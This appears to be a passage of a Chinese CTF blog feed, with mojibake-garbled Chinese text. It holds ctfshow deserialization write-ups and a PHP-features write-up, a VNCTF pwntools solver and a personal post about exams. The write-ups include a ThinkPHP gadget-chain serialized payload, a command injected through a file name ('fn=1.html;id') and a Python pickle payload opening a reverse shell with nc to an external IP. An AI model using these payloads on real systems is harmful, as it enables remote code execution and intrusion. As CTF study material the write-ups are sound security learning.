&quot;system&quot;;</span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        $this-&gt;filter = &quot;system&quot;;</span><br><span class="line">        $this-&gt;config = [&quot;var_ajax&quot;=&gt;&#x27;huha&#x27;];</span><br><span class="line">        $this-&gt;hook = [&quot;visible&quot;=&gt;[$this,&quot;isAjax&quot;]];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">abstract class Model&#123;</span><br><span class="line">    protected $append = [];</span><br><span class="line">    private $data = [];</span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        # appendé”®å¿…é¡»å­˜åœ¨ï¼Œå¹¶ä¸”ä¸$this-&gt;dataç›¸åŒ</span><br><span class="line">        $this-&gt;append = [&quot;huha&quot;=&gt;[]];</span><br><span class="line">        $this-&gt;data = [&quot;huha&quot;=&gt;new Request()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\model;</span><br><span class="line"></span><br><span class="line">use think\Model;</span><br><span class="line"></span><br><span class="line">class Pivot extends Model</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\process\pipes;</span><br><span class="line">use think\model\Pivot;</span><br><span class="line"></span><br><span class="line">class Windows</span><br><span class="line">&#123;</span><br><span class="line">    private $files = [];</span><br><span class="line"></span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;files=[new Pivot()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">//var_dump(new Windows());</span><br><span class="line">echo base64_encode(serialize(new Windows()));</span><br></pre></td></tr></table></figure><p>expï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data=TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czo0OiJodWhhIjthOjA6e319czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czo0OiJodWhhIjtPOjEzOiJ0aGlua1xSZXF1ZXN0IjozOntzOjc6IgAqAGhvb2siO2E6MTp7czo3OiJ2aXNpYmxlIjthOjI6e2k6MDtyOjc7aToxO3M6NjoiaXNBamF4Ijt9fXM6OToiACoAZmlsdGVyIjtzOjY6InN5c3RlbSI7czo2OiJjb25maWciO2E6MTp7czo4OiJ2YXJfYWpheCI7czo0OiJodWhhIjt9fX19fX0=&amp;huha[]=tac /flag</span><br></pre></td></tr></table></figure><h2 id="web275"><a href="#web275" class="headerlink" title="web275"></a>web275</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class filter&#123;</span><br><span class="line">    public $filename;</span><br><span class="line">    public $filecontent;</span><br><span class="line">    public $evilfile=false;</span><br><span class="line"></span><br><span class="line">    public function __construct($f,$fn)&#123;</span><br><span class="line">        $this-&gt;filename=$f;</span><br><span class="line">        $this-&gt;filecontent=$fn;</span><br><span class="line">    &#125;</span><br><span class="line">    public function checkevil()&#123;</span><br><span class="line">        if(preg_match(&#x27;/php|\.\./i&#x27;, $this-&gt;filename))&#123;</span><br><span class="line">            $this-&gt;evilfile=true;</span><br><span class="line">        &#125;</span><br><span class="line">        if(preg_match(&#x27;/flag/i&#x27;, $this-&gt;filecontent))&#123;</span><br><span class="line">            $this-&gt;evilfile=true;</span><br><span class="line">        &#125;</span><br><span class="line">        return $this-&gt;evilfile;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        if($this-&gt;evilfile)&#123;</span><br><span class="line">            system(&#x27;rm &#x27;.$this-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;fn&#x27;]))&#123;</span><br><span class="line">    $content = file_get_contents(&#x27;php://input&#x27;);</span><br><span class="line">    $f = new filter($_GET[&#x27;fn&#x27;],$content);</span><br><span class="line">    if($f-&gt;checkevil()===false)&#123;</span><br><span class="line">        file_put_contents($_GET[&#x27;fn&#x27;], $content);</span><br><span class="line">        copy($_GET[&#x27;fn&#x27;],md5(mt_rand()).&#x27;.txt&#x27;);</span><br><span class="line">        unlink($_SERVER[&#x27;DOCUMENT_ROOT&#x27;].&#x27;/&#x27;.$_GET[&#x27;fn&#x27;]);</span><br><span class="line">        echo &#x27;work done&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &#x27;where is flag?&#x27;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ‰ç‚¹å¥½ç©ï¼Œä»–å¼•å…¥äº†systemè¿™ä¸ªå‡½æ•°ï¼Œç„¶åå‘ç°ç›´æ¥å¯ä»¥rceäº†</p><p>ä¼ fn=1.html;id</p><h2 id="web277-python-ååºåˆ—åŒ–"><a href="#web277-python-ååºåˆ—åŒ–" class="headerlink" title="web277(python ååºåˆ—åŒ–)"></a>web277(python ååºåˆ—åŒ–)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">where is flag?&lt;!--/backdoor?data= m=base64.b64decode(data) m=pickle.loads(m) --&gt;</span><br></pre></td></tr></table></figure><p>ä»è¿™æ®µä»£ç èƒ½çœ‹å‡ºæ—¶pythonåºåˆ—åŒ–ä¸”å­˜åœ¨ååºåˆ—åŒ–çš„æ¼æ´</p><h2 id="reduce-ä»‹ç»"><a href="#reduce-ä»‹ç»" class="headerlink" title="_reduce_()ä»‹ç»"></a>_<em>reduce</em>_()ä»‹ç»</h2><p>å½“å®šä¹‰æ‰©å±•ç±»å‹æ—¶ï¼ˆä¹Ÿå°±æ˜¯ä½¿ç”¨Pythonçš„Cè¯­è¨€APIå®ç°çš„ç±»å‹ï¼‰ï¼Œå¦‚æœä½ æƒ³pickleå®ƒä»¬ï¼Œä½ å¿…é¡»å‘Šè¯‰Pythonå¦‚ä½•pickleå®ƒä»¬ã€‚ <strong>reduce</strong> è¢«å®šä¹‰ä¹‹åï¼Œå½“å¯¹è±¡è¢«Pickleæ—¶å°±ä¼šè¢«è°ƒç”¨ã€‚å®ƒè¦ä¹ˆè¿”å›ä¸€ä¸ªä»£è¡¨å…¨å±€åç§°çš„å­—ç¬¦ä¸²ï¼ŒPyhtonä¼šæŸ¥æ‰¾å®ƒå¹¶pickleï¼Œè¦ä¹ˆè¿”å›ä¸€ä¸ªå…ƒç»„ã€‚è¿™ä¸ªå…ƒç»„åŒ…å«2åˆ°5ä¸ªå…ƒç´ ï¼Œå…¶ä¸­åŒ…æ‹¬ï¼šä¸€ä¸ªå¯è°ƒç”¨çš„å¯¹è±¡ï¼Œç”¨äºé‡å»ºå¯¹è±¡æ—¶è°ƒç”¨ï¼›ä¸€ä¸ªå‚æ•°å…ƒç´ ï¼Œä¾›é‚£ä¸ªå¯è°ƒç”¨å¯¹è±¡ä½¿ç”¨ï¼›è¢«ä¼ é€’ç»™ <strong>setstate</strong> çš„çŠ¶æ€ï¼ˆå¯é€‰ï¼‰ï¼›ä¸€ä¸ªäº§ç”Ÿè¢«pickleçš„åˆ—è¡¨å…ƒç´ çš„è¿­ä»£å™¨ï¼ˆå¯é€‰ï¼‰ï¼›ä¸€ä¸ªäº§ç”Ÿè¢«pickleçš„å­—å…¸å…ƒç´ çš„è¿­ä»£å™¨ï¼ˆå¯é€‰ï¼‰</p><p>å› æ­¤åˆ©ç”¨æ­¤æ¥æ„é€ åºåˆ—åŒ–ï¼Œç„¶åæ‹¿flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import os</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">class CTFshow():</span><br><span class="line">    def sw(self):</span><br><span class="line">        print(self.show)</span><br><span class="line">    def __init__(self,show):</span><br><span class="line">        self.show=show</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        return (eval,(&quot;__import__(&#x27;os&#x27;).popen(&#x27;nc 101.42.138.249 6666 -e /bin/sh&#x27;).read()&quot;,))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cs = CTFshow(&quot;http://6122e189-3fb6-45a2-b099-aeb0071f1ddd.challenge.ctf.show/&quot;)</span><br><span class="line"></span><br><span class="line">ctfshow_usr= pickle.dumps(cs)</span><br><span class="line"></span><br><span class="line">print(base64.b64encode((ctfshow_usr)))</span><br></pre></td></tr></table></figure><p>ä¼ å‚</p><p><img src="https://img-blog.csdnimg.cn/fcff2675c6124532831899a8d6cb09c9.png" alt="img"></p><p>æˆåŠŸæ‰§è¡Œï¼Œåå¼¹shell åç›´æ¥æ‹¿flag</p><p><img src="https://img-blog.csdnimg.cn/35c041ee6fa541a49b0fb6fc30c077fb.png" alt="img"></p><h2 id="web278"><a href="#web278" class="headerlink" title="web278"></a>web278</h2><p>æ–¹æ³•åŒä¸Šã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ctfshowååºåˆ—åŒ–&quot;&gt;&lt;a href=&quot;#ctfshowååºåˆ—åŒ–&quot; class=&quot;headerlink&quot; title=&quot;ctfshowååºåˆ—åŒ–&quot;&gt;&lt;/a&gt;ctfshowååºåˆ—åŒ–&lt;/h1&gt;&lt;h2 id=&quot;web254&quot;&gt;&lt;a href=&quot;#web254&quot; cla</summary>
      
    
    
    
    <category term="wp" scheme="http://websec.space/categories/wp/"/>
    
    
    <category term="wp" scheme="http://websec.space/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>æµ…èŠ</title>
    <link href="http://websec.space/2022/02/24/%E6%B5%85%E8%81%8A%E4%B8%80%E4%B8%8B%E6%96%87%E5%8C%96%E8%AF%BE%E5%92%8C%E6%8A%80%E6%9C%AF%E7%9A%84%E5%85%B3%E7%B3%BB/"/>
    <id>http://websec.space/2022/02/24/%E6%B5%85%E8%81%8A%E4%B8%80%E4%B8%8B%E6%96%87%E5%8C%96%E8%AF%BE%E5%92%8C%E6%8A%80%E6%9C%AF%E7%9A%84%E5%85%B3%E7%B3%BB/</id>
    <published>2022-02-23T16:00:00.000Z</published>
    <updated>2022-02-24T03:32:51.274Z</updated>
    
    <content type="html"><![CDATA[<h1 id="æµ…èŠ"><a href="#æµ…èŠ" class="headerlink" title="æµ…èŠ"></a>æµ…èŠ</h1><blockquote><p>ä»Šå¤©å››çº§å‡ºåˆ†ï¼Œæ²¡è¿‡ï¼Œæœ‰äº›æ„æ–™ä¹‹ä¸­ï¼Œä½†æŸ¥åˆ°çš„é‚£ä¸€åˆ»è¿˜æ˜¯æœ‰äº›å‡ºä¹æ„æ–™çš„ï¼Œæ­£å¥½åˆšæŸ¥å®Œåˆ†æ•°ï¼Œå®¶é‡Œçªç„¶æ²¡ç”µäº†ï¼Œä¸çŸ¥é“ä¸ºç”šä¹ˆæœ€è¿‘è€æ˜¯è·³é—¸ï¼Œè¶ç€è¿™å›æ–­ç½‘æ–­ç”µï¼Œæˆ‘å½“æ˜¯å†™ä¸€ä¸ªè®°å½•ã€‚</p></blockquote><p>â€‹        æœ‰å‡ ä¸ªæœ‹å‹é—®æˆ‘æ€ä¹ˆå›äº‹éš¾å—ï¼Œæˆ‘éƒ½æ˜¯å›å¤æ„Ÿè§‰è¿˜å¥½ï¼Œæˆ‘å¿ƒé‡Œä¹Ÿæ¸…æ¥šï¼Œæˆ‘å½“æ—¶çš„æ°´å¹³å°±æ˜¯å†åŠæ ¼çº¿çš„è¾¹ç¼˜çš„ï¼Œå€Ÿæ­¤æŒ‚ç§‘ä¸€é—¨ï¼ˆè¿˜æœ‰è¡¥è€ƒï¼Œä¸ç®—æŒ‚ç§‘ï¼Œè–›å®šè°”çš„æŒ‚ç§‘ï¼‰ï¼Œå››çº§æ²¡è¿‡çš„æˆå°±è¾¾æˆã€‚ï¼ˆç°åœ¨å€’æ˜¯å¤Ÿä¹è§‚ï¼‰ã€‚</p><p>â€‹        å€Ÿæ­¤è®°å½•ä¸€ä¸‹å­¦ä¹ æˆç»©çš„è½¬å˜ï¼Œå¤§ä¸€ä¸€å¹´ç»©ç‚¹è¿˜æ˜¯å¹´çºªç¬¬å››ï¼Œå½“æ—¶è¿˜æœ‰ç«èµ›æˆç»©åŠ æŒæ„Ÿè§‰é£å…‰æ— é™ã€‚ä¹Ÿæ˜¯ä»å¤§ä¸€ä¸‹ï¼Œåˆ°å¤§äºŒä¸Šæˆ‘æ•´ä¸ªäººçš„æ€ç»´å‘ç”Ÿäº†è½¬å˜ï¼Œä»ä¹‹å‰ä¸€ä¸ªåšé¢˜å®¶ï¼ˆè¿˜æ˜¯ä¸ªä¸åˆæ ¼çš„åšé¢˜å®¶ï¼‰åˆ°æŠ€æœ¯æµçš„è½¬å˜ï¼ˆä¹Ÿæ˜¯ä¸ªä¸åˆæ ¼çš„æŠ€æœ¯æµï¼‰ï¼Œä½†å­¦ä¹ çš„æ€ç»´ç¡®å®å‘ç”Ÿäº†å¾ˆå¤§çš„è½¬å˜ï¼Œæˆ‘æ²¡æƒ³åˆ°çš„æ˜¯èƒ½è¿™ä¹ˆå¿«åœ¨æˆç»©ä¸Šå±•ç°ï¼Œç¡®å®è„‘è¢‹æœ¦æœ¦èƒ§èƒ§çš„ã€‚æ€ä¹ˆè¯´å‘¢ï¼Œæˆ‘ä¹‹å‰ä¸€ç›´æ˜¯ä¸€ä¸ªä¸­ç«‹çš„æ€ç»´ï¼Œä¹Ÿå°±æ˜¯è¿™ç§ä¸­ç«‹çš„æ€ç»´è®©æˆ‘æœ‰ç‚¹æç«¯ï¼Œæˆ‘å¹³æ—¶æ—¶é—´éƒ½æ‹¿æ¥æè‡ªå·±æ„Ÿå…´è¶£çš„ä¸œè¥¿äº†ï¼Œæ‰€ä»¥æŒ‡æœ›ç€æœŸæœ«çªå‡»ï¼Œè€Œä¸Šä¸€ä¸ªå­¦æœŸåˆæ°æ°æ˜¯å¤§å­¦å››å¹´ä¸­è¯¾ç¨‹æœ€å¤šçš„ä¸€ä¸ªå­¦æœŸï¼Œæ•´æ•´åä¸€é—¨ï¼ˆä¸€ä¼šå¦‚æœå¦‚æœå¯ä»¥æˆ‘åœ¨ä¸‹é¢é™„ä¸€ä¸‹è¯¾è¡¨ï¼‰ï¼Œæœ€åçªå‡»å°±ä»é«˜åˆ†å˜æˆäº†ä¸æŒ‚ç§‘ï¼ŒåŒæ—¶è¿™æ—¶å€™è€ƒå››çº§ï¼Œå¯¼è‡´ç›´æ¥æ”¾å¼ƒäº†å››çº§çš„å¤ä¹ ï¼Œåˆ°äº†å››çº§è€ƒè¯•çš„å‰ä¸€å¤©æˆ‘æ‰åšäº†å‡ ä»½ä¹‹å‰ä¹°çš„é¢˜ã€‚ä¼—å¤šå®¢è§‚åŸå› å†æ­¤ï¼Œå°½ç®¡æˆ‘è®¤ä¸ºæˆ‘ä¸»è§‚ä¸Šå·²ç»å°½åŠ›äº†ï¼Œä¹Ÿæ˜¯æ— åŠ›å›å¤©äº†ï¼Œæ¯•ç«Ÿä¸æ˜¯ä»€ä¹ˆç¥äººã€‚</p><p>â€‹        è¿™æ˜¯ä¸€ä¸ªåäº‹æƒ…åˆæ˜¯ä¸€ä¸ªå¥½äº‹æƒ…ï¼Œåäº‹æƒ…æ˜¯ç¡®å®åˆæŒ‚äº†ç§‘åˆæ²¡è¿‡å››çº§ï¼Œå¥½äº‹æƒ…æ˜¯æˆ‘åŒ…è¢±æ²¡äº†ï¼Œç»ˆäºä¸ç”¨è€ƒè™‘ä»€ä¹ˆæˆ‘è¿™å‘¨ä¸€ç›´æctfæ˜¯ä¸æ˜¯ä¸Šè¯¾çš„ä¸œè¥¿æ²¡å­¦å½±å“æˆ‘æœŸæœ«æˆç»©ï¼Œè¿™ä¸ªåŒ…è¢±æ˜¯å½»åº•æ”¾ä¸‹äº†ã€‚ä¸Šä¸ªå­¦æœŸæ˜¯æwebçš„å¼€å±€ï¼Œèµ°äº†å¾ˆå¤šå¼¯è·¯ï¼Œä½†è·Œè·Œæ’æ’è®©æˆ‘æ‰¾åˆ°æ–¹å‘äº†ï¼Œä½†ä¹Ÿè®¤è¯†åˆ°å¥½åƒè¿˜å·®çš„å¥½è¿œï¼Œé‚£å¤©ä»èŠå¤©ä¸­ä¹Ÿèƒ½çœ‹åˆ°ï¼Œæˆ‘çœŸçš„å·®çš„æœ‰ç‚¹å¤šï¼Œå¯’å‡ç®—æ˜¯å¼€å§‹äº†ä¸€äº›ä¸œè¥¿ï¼Œä½†å¯èƒ½æŠŠæˆ˜çº¿æ‹‰å¾—æœ‰ç‚¹å¤ªé•¿äº†ï¼Œå¼€å­¦è¦å¥½å¥½åšæŒä½ä¸€ä¸ªæ–¹å‘ææ·±ä¸€ç‚¹ï¼Œå½“ç„¶ä¸‹å­¦æœŸè¯¾ç¨‹ä¹Ÿå˜å°‘äº†ï¼Œæˆ‘ä¹Ÿè¦æ‹¿å‡ºä¸€å®šç²¾åŠ›å»å­¦è‹±è¯­ï¼Œäº‰å–æä¸€æ‰‹500+ã€‚</p><p>â€‹        </p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;æµ…èŠ&quot;&gt;&lt;a href=&quot;#æµ…èŠ&quot; class=&quot;headerlink&quot; title=&quot;æµ…èŠ&quot;&gt;&lt;/a&gt;æµ…èŠ&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;ä»Šå¤©å››çº§å‡ºåˆ†ï¼Œæ²¡è¿‡ï¼Œæœ‰äº›æ„æ–™ä¹‹ä¸­ï¼Œä½†æŸ¥åˆ°çš„é‚£ä¸€åˆ»è¿˜æ˜¯æœ‰äº›å‡ºä¹æ„æ–™çš„ï¼Œæ­£å¥½åˆšæŸ¥å®Œåˆ†æ•°ï¼Œå®¶é‡Œçªç„¶æ²¡ç”µäº†ï¼Œä¸çŸ¥é“ä¸ºç”šä¹ˆæœ€</summary>
      
    
    
    
    <category term="é—²èŠ" scheme="http://websec.space/categories/%E9%97%B2%E8%81%8A/"/>
    
    
    <category term="é—²èŠ" scheme="http://websec.space/tags/%E9%97%B2%E8%81%8A/"/>
    
  </entry>
  
  <entry>
    <title>VNCTF Ezmath</title>
    <link href="http://websec.space/2022/02/15/VNCTF%20Ezmath/"/>
    <id>http://websec.space/2022/02/15/VNCTF%20Ezmath/</id>
    <published>2022-02-14T16:00:00.000Z</published>
    <updated>2022-02-14T16:49:31.591Z</updated>
    
    <content type="html"><![CDATA[<h1 id="VNCTF-Ezmath"><a href="#VNCTF-Ezmath" class="headerlink" title="VNCTF Ezmath"></a>VNCTF Ezmath</h1><p>æ¯”èµ›å½“å¤©ä¸ä¼šå†™ncçš„è„šæœ¬æˆ‘æ‘†çƒ‚äº†ï¼Œä»Šå¤©å­¦ä¹ äº†ä¸€ä¸‹ï¼Œæ¯”æƒ³è±¡çš„ç®€å•ï¼Œè®°å½•ä¸€ä¸‹ã€‚</p><p>æè¿°ä¸€ä¸‹é¢˜ç›®ï¼Œå…ˆæ˜¯ç ´è§£ä¸€ä¸‹sha256åŠ ç›ï¼Œä½†ä½æ•°å›ºå®šï¼Œå¾ˆå®¹æ˜“ 2<sup>n</sup>-1 mod(15)==0</p><p><img src="https://img-blog.csdnimg.cn/3ae6dc9c395343bfa4e630b6488077b5.png" alt="img"></p><p>æ‰€ç”¨çš„åº“ä½¿ç”¨pwntools</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install pwntools</span><br></pre></td></tr></table></figure><p>ç®€å•çš„ä»‹ç»ï¼š</p><blockquote><p>è¿œç¨‹ï¼šsh = remote(â€œ127.0.0.1â€,10001)<br>å…³é—­è¿æ¥ï¼šsh.close()<br>sh.send(data)  å‘é€æ•°æ®<br>sh.sendline(data)  å‘é€ä¸€è¡Œæ•°æ®ï¼Œç›¸å½“äºåœ¨æ•°æ®åé¢åŠ \n<br>sh.recv(numb = 2048, timeout = dufault)  æ¥å—æ•°æ®ï¼ŒnumbæŒ‡å®šæ¥æ”¶çš„å­—èŠ‚ï¼ŒtimeoutæŒ‡å®šè¶…æ—¶<br>sh.recvline(keepends=True)  æ¥å—ä¸€è¡Œæ•°æ®ï¼Œkeependsä¸ºæ˜¯å¦ä¿ç•™è¡Œå°¾çš„\n<br>sh.recvuntil(â€œHello,World\nâ€,drop=fasle)  æ¥å—æ•°æ®ç›´åˆ°æˆ‘ä»¬è®¾ç½®çš„æ ‡å¿—å‡ºç°<br>sh.recvall()  ä¸€ç›´æ¥æ”¶ç›´åˆ°EOF<br>sh.recvrepeat(timeout = default)  æŒç»­æ¥å—ç›´åˆ°EOFæˆ–timeout<br>sh.interactive()  ç›´æ¥è¿›è¡Œäº¤äº’ï¼Œç›¸å½“äºå›åˆ°shellçš„æ¨¡å¼ï¼Œåœ¨å–å¾—shellä¹‹åä½¿ç”¨</p></blockquote><p>è§£é¢˜è„šæœ¬</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">i=0</span><br><span class="line">def sha_256code(encode,salt):</span><br><span class="line">    str=string.ascii_letters+string.digits</span><br><span class="line">    for i1 in str:</span><br><span class="line">        for i2 in str:</span><br><span class="line">            for i3 in str:</span><br><span class="line">                for i4 in str:</span><br><span class="line">                    plain=i1+i2+i3+i4+salt</span><br><span class="line">                    encode1=hashlib.sha256(plain.encode()).hexdigest()</span><br><span class="line">                    if encode1==encode:</span><br><span class="line">                        return (i1+i2+i3+i4)</span><br><span class="line">sh = remote(&quot;node4.buuoj.cn&quot;,28028)</span><br><span class="line">sh.recvuntil(&quot;(&quot;,)</span><br><span class="line">sh.recvuntil(&quot;+&quot;,)</span><br><span class="line">salt=sh.recvuntil(&quot;)&quot;,).decode()[:-1]</span><br><span class="line">sh.recvuntil(&quot;== &quot;,)</span><br><span class="line">encode=sh.recvuntil(&quot;\n&quot;,).decode()[:-1]</span><br><span class="line">data=sha_256code(encode,salt)</span><br><span class="line">sh.sendline(data)</span><br><span class="line">for i in range(777):</span><br><span class="line">    sh.recvuntil(&quot;the &quot;)</span><br><span class="line">    num = sh.recvuntil(&quot;th&quot;).decode()[:-2].strip()</span><br><span class="line">    i+=1</span><br><span class="line">    print(i)</span><br><span class="line">    data2=int(num)*4</span><br><span class="line">    sh.sendline(str(data2))</span><br><span class="line">    sh.recvuntil(&#x27;\n&#x27;)</span><br><span class="line">    sh.recvuntil(&#x27;\n&#x27;)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;VNCTF-Ezmath&quot;&gt;&lt;a href=&quot;#VNCTF-Ezmath&quot; class=&quot;headerlink&quot; title=&quot;VNCTF Ezmath&quot;&gt;&lt;/a&gt;VNCTF Ezmath&lt;/h1&gt;&lt;p&gt;æ¯”èµ›å½“å¤©ä¸ä¼šå†™ncçš„è„šæœ¬æˆ‘æ‘†çƒ‚äº†ï¼Œä»Šå¤©å­¦ä¹ äº†ä¸€ä¸‹ï¼Œæ¯”æƒ³è±¡çš„ç®€</summary>
      
    
    
    
    <category term="å¯†ç å­¦" scheme="http://websec.space/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    
    <category term="å¯†ç å­¦" scheme="http://websec.space/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow phpçš„ç‰¹æ€§</title>
    <link href="http://websec.space/2022/02/15/ctfshow%20php%E7%9A%84%E7%89%B9%E6%80%A7/"/>
    <id>http://websec.space/2022/02/15/ctfshow%20php%E7%9A%84%E7%89%B9%E6%80%A7/</id>
    <published>2022-02-14T16:00:00.000Z</published>
    <updated>2022-02-15T04:41:38.948Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ctfshow-phpçš„ç‰¹æ€§"><a href="#ctfshow-phpçš„ç‰¹æ€§" class="headerlink" title="ctfshow phpçš„ç‰¹æ€§"></a>ctfshow phpçš„ç‰¹æ€§</h1><h2 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[0-9]/&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>preg_matchçš„å€¼ä¼ å…¥æ•°ç»„ä¸º0</p><p>ä¸‹é¢æ˜¯intvalçš„è¿”å›å€¼çš„ä»‹ç»ï¼Œæ‰€ä»¥ç›´æ¥ä¼ å…¥ä¸€ä¸ªä¸ä¸º0çš„æ•°ç»„å³å¯ã€‚</p><p><img src="https://img-blog.csdnimg.cn/dfd7bc9a2d47419198458b4c951ad0ab.png" alt="img"></p><p>payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">num[]=a</span><br></pre></td></tr></table></figure><h2 id="web90"><a href="#web90" class="headerlink" title="web90"></a>web90</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class="line">    $num = $_GET[&#x27;num&#x27;];</span><br><span class="line">    if($num===&quot;4476&quot;)&#123;</span><br><span class="line">        die(&quot;no no no!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(intval($num,0)===4476)&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo intval($num,0);</span><br><span class="line">    &#125;</span><br><span 